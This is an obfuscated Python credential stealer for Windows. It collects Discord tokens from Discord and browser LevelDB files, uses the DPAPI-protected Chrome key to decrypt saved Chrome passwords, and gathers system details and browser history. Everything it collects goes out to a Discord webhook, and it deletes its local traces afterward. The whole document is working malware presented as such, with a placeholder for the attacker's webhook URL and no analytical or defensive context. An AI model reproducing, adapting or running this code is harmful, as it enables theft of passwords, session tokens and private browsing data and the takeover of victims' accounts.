import os #line:1
import re #line:2
import json #line:3
import base64 #line:4
import sqlite3 #line:5
import win32crypt #line:6
import shutil #line:7
import zipfile #line:8
import requests #line:9
import platform #line:10
import socket #line:11
import uuid #line:12
import psutil #line:13
import logging #line:14
import subprocess #line:15
import sys #line:16
import winreg #line:17
from requests_toolbelt .multipart .encoder import MultipartEncoder #line:18
from datetime import datetime #line:19
from Crypto .Cipher import AES #line:20
from datetime import timedelta ,datetime #line:21
from discord_webhook import DiscordWebhook #line:22
from urllib .request import Request ,urlopen #line:23

# FILE IS OBFUSCATED

WEBURL ="WEBHOOK_URL_HERE"#line:27
WEBHOOK_URL =WEBURL #line:31
PING_ME =False #line:32
def find_tokens (OOOO000O0OO0O0OOO ):#line:33
    OOOO000O0OO0O0OOO +='\\Local Storage\\leveldb'#line:34
    O0O0OOO0O000OOOOO =[]#line:35
    for O0O0OOO00OO0000O0 in os .listdir (OOOO000O0OO0O0OOO ):#line:36
        if not O0O0OOO00OO0000O0 .endswith ('.log')and not O0O0OOO00OO0000O0 .endswith ('.ldb'):#line:37
            continue #line:38
        for O000O0O000O0OO0O0 in [O0OO0OOOO0OO0OO00 .strip ()for O0OO0OOOO0OO0OO00 in open (f'{OOOO000O0OO0O0OOO}\\{O0O0OOO00OO0000O0}',errors ='ignore').readlines ()if O0OO0OOOO0OO0OO00 .strip ()]:#line:39
            for O000O0O0OO0O000OO in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',r'mfa\.[\w-]{84}'):#line:40
                for OO0O0O000O0O00O00 in re .findall (O000O0O0OO0O000OO ,O000O0O000O0OO0O0 ):#line:41
                    O0O0OOO0O000OOOOO .append (OO0O0O000O0O00O00 )#line:42
    return O0O0OOO0O000OOOOO #line:43
def main ():#line:44
    OOOOOO0O00OOO0O0O =os .getenv ('LOCALAPPDATA')#line:45
    O00O0OOOO0000OO0O =os .getenv ('APPDATA')#line:46
    OOOOO00OO0O0O00O0 ={'Discord':O00O0OOOO0000OO0O +'\\Discord','Discord Canary':O00O0OOOO0000OO0O +'\\discordcanary','Discord PTB':O00O0OOOO0000OO0O +'\\discordptb','Google Chrome':OOOOOO0O00OOO0O0O +'\\Google\\Chrome\\User Data\\Default','Opera':O00O0OOOO0000OO0O +'\\Opera Software\\Opera Stable','Brave':OOOOOO0O00OOO0O0O +'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Yandex':OOOOOO0O00OOO0O0O +'\\Yandex\\YandexBrowser\\User Data\\Default'}#line:47
    O00O0O00O00OO0000 ='@everyone'if PING_ME else ''#line:48
    for O0OOO00OO0OOO0O0O ,OOOO0OOOO00OO000O in OOOOO00OO0O0O00O0 .items ():#line:49
        if not os .path .exists (OOOO0OOOO00OO000O ):#line:50
            continue #line:51
        O00O0O00O00OO0000 +=f'\n**{O0OOO00OO0OOO0O0O}**\n```\n'#line:52
        OOOO0O00O00OOOO00 =find_tokens (OOOO0OOOO00OO000O )#line:53
        if len (OOOO0O00O00OOOO00 )>0 :#line:54
            for OOO0000OO0OO00000 in OOOO0O00O00OOOO00 :#line:55
                O00O0O00O00OO0000 +=f'{OOO0000OO0OO00000}\n'#line:56
        else :#line:57
            O00O0O00O00OO0000 +='No tokens found.\n'#line:58
        O00O0O00O00OO0000 +='```'#line:59
    O0O00OO0000OOO0O0 ={'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}#line:60
    O0OO0OO0OOOOO0O00 =json .dumps ({'content':O00O0O00O00OO0000 })#line:61
    try :#line:62
        OO0000O00OOO000OO =Request (WEBHOOK_URL ,data =O0OO0OO0OOOOO0O00 .encode (),headers =O0O00OO0000OOO0O0 )#line:63
        urlopen (OO0000O00OOO000OO )#line:64
    except :#line:65
        pass #line:66
discord_webhook_url =WEBURL #line:71
try :#line:74
    cpu_name =subprocess .check_output ('wmic cpu get name',shell =True ).decode ().split ('\n')[1 ].strip ()#line:75
except subprocess .CalledProcessError :#line:76
    cpu_name =platform .processor ()#line:77
try :#line:79
    ram_size =float (subprocess .check_output ('wmic memphysical get MaxMember',shell =True ).decode ().split ()[1 ])/1024 #line:80
except subprocess .CalledProcessError :#line:81
    ram_size =psutil .virtual_memory ().total /(1024.0 **3 )#line:82
disk_size =psutil .disk_usage ('/').total /(1024.0 **3 )#line:84
system_info ="""
**Informations système :**
- Système d'exploitation: {} {}
- Architecture: {}
- Version de Python: {}
- CPU: {}
- RAM: {:.2f} GB
- Disque dur: {:.2f} GB
""".format (platform .system (),platform .release (),platform .machine (),platform .python_version (),cpu_name ,ram_size ,disk_size )#line:102
payload ={"content":system_info }#line:107
response =requests .post (discord_webhook_url ,json =payload )#line:108
if response .status_code ==204 :#line:110
    print ("Informations système envoyées avec succès sur Discord.")#line:111
else :#line:112
    print ("Une erreur est survenue lors de l'envoi des informations système sur Discord.")#line:113
def get_chrome_datetime (O0OO00OOOOO0OOO0O ):#line:117
    ""#line:119
    return datetime (1601 ,1 ,1 )+timedelta (microseconds =O0OO00OOOOO0OOO0O )#line:120
def get_encryption_key ():#line:122
    O0O00OOO0O00O0OO0 =os .path .join (os .environ ["USERPROFILE"],"AppData","Local","Google","Chrome","User Data","Local State")#line:125
    with open (O0O00OOO0O00O0OO0 ,"r",encoding ="utf-8")as OOOOO000O0OO0OO0O :#line:126
        OOO00O00O00OO0OOO =OOOOO000O0OO0OO0O .read ()#line:127
        OOO00O00O00OO0OOO =json .loads (OOO00O00O00OO0OOO )#line:128
    O0O0O00OO0OO0O000 =base64 .b64decode (OOO00O00O00OO0OOO ["os_crypt"]["encrypted_key"])#line:131
    O0O0O00OO0OO0O000 =O0O0O00OO0OO0O000 [5 :]#line:133
    return win32crypt .CryptUnprotectData (O0O0O00OO0OO0O000 ,None ,None ,None ,0 )[1 ]#line:137
def decrypt_password (O00OO0OO00OO00O0O ,OO000O00O0OO0000O ):#line:140
    try :#line:141
        OOO000O0O000OO00O =O00OO0OO00OO00O0O [3 :15 ]#line:143
        O00OO0OO00OO00O0O =O00OO0OO00OO00O0O [15 :]#line:144
        O00OOO0000O0O0O0O =AES .new (OO000O00O0OO0000O ,AES .MODE_GCM ,OOO000O0O000OO00O )#line:146
        return O00OOO0000O0O0O0O .decrypt (O00OO0OO00OO00O0O )[:-16 ].decode ()#line:148
    except :#line:149
        try :#line:150
            return str (win32crypt .CryptUnprotectData (O00OO0OO00OO00O0O ,None ,None ,None ,0 )[1 ])#line:151
        except :#line:152
            return ""#line:154
if __name__ =="__main__":#line:156
    main ()#line:157
def main ():#line:160
    O0O000O00000OO000 =get_encryption_key ()#line:162
    OOOOO00000O000O00 =os .path .join (os .environ ["USERPROFILE"],"AppData","Local","Google","Chrome","User Data","default","Login Data")#line:165
    O0OOO0O0O0O000OOO ="ChromeData.db"#line:168
    shutil .copyfile (OOOOO00000O000O00 ,O0OOO0O0O0O000OOO )#line:169
    OO0O00O000OO0O00O =sqlite3 .connect (O0OOO0O0O0O000OOO )#line:171
    O000000O0O0O00O0O =OO0O00O000OO0O00O .cursor ()#line:172
    OO0O0OO000OO00O00 ="decrypted_passwords.txt"#line:175
    with open (OO0O0OO000OO00O00 ,"w",encoding ="utf-8")as O0OO0O0OO0O0000O0 :#line:176
        O000000O0O0O00O0O .execute ("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")#line:178
        for OO00O0O00OO0OO00O in O000000O0O0O00O0O .fetchall ():#line:181
            OO0OOOO0O00O00OO0 =OO00O0O00OO0OO00O [0 ]#line:182
            O00O000O0O000000O =OO00O0O00OO0OO00O [1 ]#line:183
            OO0O000O00O00O0O0 =OO00O0O00OO0OO00O [2 ]#line:184
            O000OOOO0OOOO00OO =decrypt_password (OO00O0O00OO0OO00O [3 ],O0O000O00000OO000 )#line:185
            O0O0OO0OOO0OO00O0 =OO00O0O00OO0OO00O [4 ]#line:186
            O0OOO0OOO0O0O00O0 =OO00O0O00OO0OO00O [5 ]#line:187
            O0OO0O0OO0O0000O0 .write (f"Origin URL: {OO0OOOO0O00O00OO0.encode('utf-8', 'replace').decode('utf-8')}\n")#line:190
            O0OO0O0OO0O0000O0 .write (f"Action URL: {O00O000O0O000000O.encode('utf-8', 'replace').decode('utf-8')}\n")#line:191
            O0OO0O0OO0O0000O0 .write (f"Username: {OO0O000O00O00O0O0.encode('utf-8', 'replace').decode('utf-8')}\n")#line:192
            O0OO0O0OO0O0000O0 .write (f"Password: {O000OOOO0OOOO00OO.encode('utf-8', 'replace').decode('utf-8')}\n")#line:193
            if O0O0OO0OOO0OO00O0 !=86400000000 and O0O0OO0OOO0OO00O0 :#line:195
                O0OO0O0OO0O0000O0 .write (f"Creation date: {str(get_chrome_datetime(O0O0OO0OOO0OO00O0))}\n")#line:196
            if O0OOO0OOO0O0O00O0 !=86400000000 and O0OOO0OOO0O0O00O0 :#line:197
                O0OO0O0OO0O0000O0 .write (f"Last Used: {str(get_chrome_datetime(O0OOO0OOO0O0O00O0))}\n")#line:198
            O0OO0O0OO0O0000O0 .write ("="*50 +"\n")#line:199
    O000000O0O0O00O0O .close ()#line:201
    OO0O00O000OO0O00O .close ()#line:202
    O0O00OOOOOO0OOOOO ="decrypted_passwords.zip"#line:205
    with zipfile .ZipFile (O0O00OOOOOO0OOOOO ,"w")as OO0OO0OOO0O00O0OO :#line:206
        OO0OO0OOO0O00O0OO .write (OO0O0OO000OO00O00 )#line:207
    OOO0OOO00000OOO00 =WEBURL #line:210
    with open (O0O00OOOOOO0OOOOO ,"rb")as OO0000000OO00OOO0 :#line:211
        requests .post (OOO0OOO00000OOO00 ,files ={"file":OO0000000OO00OOO0 })#line:212
    os .remove (OO0O0OO000OO00O00 )#line:215
    os .remove (O0O00OOOOOO0OOOOO )#line:216
    try :#line:217
        os .remove (O0OOO0O0O0O000OOO )#line:219
    except :#line:220
        pass #line:221
if __name__ =="__main__":#line:224
    main ()#line:225
discord_webhook_url =WEBURL #line:230
def get_browser_name ():#line:233
    try :#line:234
        OO00O0O000000000O =winreg .OpenKey (winreg .HKEY_CURRENT_USER ,r"Software\Microsoft\Windows\CurrentVersion\Run")#line:235
        OOO0O0OO0OO0O00O0 ,_O000O000OO000OO00 =winreg .QueryValueEx (OO00O0O000000000O ,"Google Chrome")#line:236
        return "Google Chrome"#line:237
    except :#line:238
        pass #line:239
    try :#line:241
        OO00O0O000000000O =winreg .OpenKey (winreg .HKEY_CURRENT_USER ,r"Software\Microsoft\Windows\CurrentVersion\Run")#line:242
        OOO0O0OO0OO0O00O0 ,_O000O000OO000OO00 =winreg .QueryValueEx (OO00O0O000000000O ,"Microsoft Edge")#line:243
        return "Microsoft Edge"#line:244
    except :#line:245
        pass #line:246
    try :#line:248
        OO00O0O000000000O =winreg .OpenKey (winreg .HKEY_CURRENT_USER ,r"Software\Mozilla\Firefox")#line:249
        _O000O000OO000OO00 ,_O000O000OO000OO00 ,O0O0OOO00OOO0O000 ,_O000O000OO000OO00 =winreg .EnumValue (OO00O0O000000000O ,0 )#line:250
        return "Mozilla Firefox"#line:251
    except :#line:252
        pass #line:253
    try :#line:255
        OO00O0O000000000O =winreg .OpenKey (winreg .HKEY_CURRENT_USER ,r"Software\Opera Software\Opera Stable")#line:256
        _O000O000OO000OO00 ,_O000O000OO000OO00 ,O0O0OOO00OOO0O000 ,_O000O000OO000OO00 =winreg .EnumValue (OO00O0O000000000O ,0 )#line:257
        return "Opera"#line:258
    except :#line:259
        pass #line:260
    try :#line:262
        OO00O0O000000000O =winreg .OpenKey (winreg .HKEY_CURRENT_USER ,r"Software\Brave")#line:263
        _O000O000OO000OO00 ,_O000O000OO000OO00 ,O0O0OOO00OOO0O000 ,_O000O000OO000OO00 =winreg .EnumValue (OO00O0O000000000O ,0 )#line:264
        return "Brave"#line:265
    except :#line:266
        pass #line:267
    try :#line:269
        OO00O0O000000000O =winreg .OpenKey (winreg .HKEY_CURRENT_USER ,r"Software\Vivaldi\Vivaldi")#line:270
        _O000O000OO000OO00 ,_O000O000OO000OO00 ,O0O0OOO00OOO0O000 ,_O000O000OO000OO00 =winreg .EnumValue (OO00O0O000000000O ,0 )#line:271
        return "Vivaldi"#line:272
    except :#line:273
        pass #line:274
    try :#line:276
        OO00O0O000000000O =winreg .OpenKey (winreg .HKEY_CURRENT_USER ,r"Software\Microsoft\Internet Explorer\Main")#line:277
        _O000O000OO000OO00 ,_O000O000OO000OO00 ,O0O0OOO00OOO0O000 ,_O000O000OO000OO00 =winreg .EnumValue (OO00O0O000000000O ,0 )#line:278
        return "Internet Explorer"#line:279
    except :#line:280
        pass #line:281
    return "Unknown"#line:283
def get_browser_history (O0OO00OOOOO00O0OO ):#line:286
    OOO0O0000OOOOOO0O =[]#line:287
    if O0OO00OOOOO00O0OO =="Google Chrome":#line:288
        try :#line:289
            O0O00O0OO0OOO00O0 =os .path .expanduser ("~")+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"#line:290
            with open (O0O00O0OO0OOO00O0 ,'r',encoding ='utf-8')as OOO000O0000O00OOO :#line:291
                O000O0O0O00OOOOO0 =json .load (OOO000O0000O00OOO )#line:292
            OOO0O0000OOOOOO0O .extend (O000O0O0O00OOOOO0 )#line:293
        except :#line:294
            pass #line:295
    elif O0OO00OOOOO00O0OO =="Microsoft Edge":#line:296
        try :#line:297
            O0O0O00O00O0O0O00 =os .path .expanduser ("~")+"\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"#line:298
            with open (O0O0O00O00O0O0O00 ,'r',encoding ='utf-8')as OOO000O0000O00OOO :#line:299
                OO00O0000O0O00OO0 =json .load (OOO000O0000O00OOO )#line:300
            OOO0O0000OOOOOO0O .extend (OO00O0000O0O00OO0 )#line:301
        except :#line:302
            pass #line:303
    elif O0OO00OOOOO00O0OO =="Mozilla Firefox":#line:304
        try :#line:305
            OO000O0000O00O0O0 =os .path .expanduser ("~")+"\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\default.aws\\places.sqlite"#line:306
            import sqlite3 #line:307
            O00O0OOOOO0OOO0O0 =sqlite3 .connect (OO000O0000O00O0O0 )#line:308
            O0O0000O00OOO0OO0 =O00O0OOOOO0OOO0O0 .cursor ()#line:309
            O0O0000O00OOO0OO0 .execute ("SELECT url, title, visit_count, last_visit_date FROM moz_places")#line:310
            O0OO0OOO0O000OOOO =O0O0000O00OOO0OO0 .fetchall ()#line:311
            for OOO0OO0OO00OO00OO ,OO0000O0O0O0O00O0 ,OO0OO0000O00O0000 ,OOOOOOO0O0OOO000O in O0OO0OOO0O000OOOO :#line:312
                OOO0O0000OOOOOO0O .append ({"url":OOO0OO0OO00OO00OO ,"title":OO0000O0O0O0O00O0 ,"visit_count":OO0OO0000O00O0000 ,"last_visit_date":OOOOOOO0O0OOO000O })#line:313
        except :#line:314
            pass #line:315
    elif O0OO00OOOOO00O0OO =="Opera":#line:316
        try :#line:317
            O0OOO000O0000OO00 =os .path .expanduser ("~")+"\\AppData\\Roaming\\Opera Software\\Opera Stable\\History"#line:318
            with open (O0OOO000O0000OO00 ,'r',encoding ='utf-8')as OOO000O0000O00OOO :#line:319
                OO0O00O00O0O0O0O0 =json .load (OOO000O0000O00OOO )#line:320
            OOO0O0000OOOOOO0O .extend (OO0O00O00O0O0O0O0 )#line:321
        except :#line:322
            pass #line:323
    elif O0OO00OOOOO00O0OO =="Brave":#line:324
        try :#line:325
            OOO00O00O0000OO00 =os .path .expanduser ("~")+"\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History"#line:326
            with open (OOO00O00O0000OO00 ,'r',encoding ='utf-8')as OOO000O0000O00OOO :#line:327
                O0OOOOOO0OO00O00O =json .load (OOO000O0000O00OOO )#line:328
            OOO0O0000OOOOOO0O .extend (O0OOOOOO0OO00O00O )#line:329
        except :#line:330
            pass #line:331
    elif O0OO00OOOOO00O0OO =="Vivaldi":#line:332
        try :#line:333
            OOO0O0O0OOO0OO0OO =os .path .expanduser ("~")+"\\AppData\\Local\\Vivaldi\\User Data\\Default\\History"#line:334
            with open (OOO0O0O0OOO0OO0OO ,'r',encoding ='utf-8')as OOO000O0000O00OOO :#line:335
                O0O0OO00O000000OO =json .load (OOO000O0000O00OOO )#line:336
            OOO0O0000OOOOOO0O .extend (O0O0OO00O000000OO )#line:337
        except :#line:338
            pass #line:339
    elif O0OO00OOOOO00O0OO =="Internet Explorer":#line:340
        try :#line:341
            O0O00O00O00O0OO00 =os .path .expanduser ("~")+"\\AppData\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV01.dat"#line:342
            with open (O0O00O00O00O0OO00 ,'rb')as OOO000O0000O00OOO :#line:343
                O00O0O0OO000OOO00 =OOO000O0000O00OOO .read ()#line:344
            OOO0O0000OOOOOO0O .append ({"data":O00O0O0OO000OOO00 })#line:345
        except :#line:346
            pass #line:347
    return OOO0O0000OOOOOO0O #line:348
def send_history_to_discord ():#line:351
    OOO00O0OO000O00OO =get_browser_name ()#line:352
    O0OO00000O0OO0O00 =get_browser_history (OOO00O0OO000O00OO )#line:353
    O000OO0OO0OO0OO00 =f"{OOO00O0OO000O00OO}_browser_history_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.zip"#line:356
    with zipfile .ZipFile (O000OO0OO0OO0OO00 ,'w')as OOO0000O0OOO00000 :#line:357
        OOOOO00O0OOOO00OO =json .dumps (O0OO00000O0OO0O00 ,indent =4 )#line:358
        OOO0000O0OOO00000 .writestr (f"{OOO00O0OO000O00OO}_browser_history.json",OOOOO00O0OOOO00OO )#line:359
    with open (O000OO0OO0OO0OO00 ,'rb')as O0O0OO00O00OOOOOO :#line:362
        OO000O0OOOOOO0O0O =MultipartEncoder (fields ={"content":f"Historique de navigation pour {OOO00O0OO000O00OO}","file":(f"{OOO00O0OO000O00OO}_browser_history.zip",O0O0OO00O00OOOOOO ,"application/zip")})#line:368
        O00O0OOO0O0O0OOO0 ={"Content-Type":OO000O0OOOOOO0O0O .content_type }#line:371
        import requests #line:372
        OOO0OOOO00OOOOOOO =requests .post (discord_webhook_url ,data =OO000O0OOOOOO0O0O ,headers =O00O0OOO0O0O0OOO0 )#line:373
    os .remove (O000OO0OO0OO0OO00 )#line:376
    if OOO0OOOO00OOOOOOO .status_code ==204 :#line:378
        print (f"Historique de navigation pour {OOO00O0OO000O00OO} envoyé avec succès sur Discord.")#line:379
    else :#line:380
        print (f"Une erreur est survenue lors de l'envoi de l'histore")#line:381
if __name__ =="__main__":#line:383
    send_history_to_discord ()#line:384
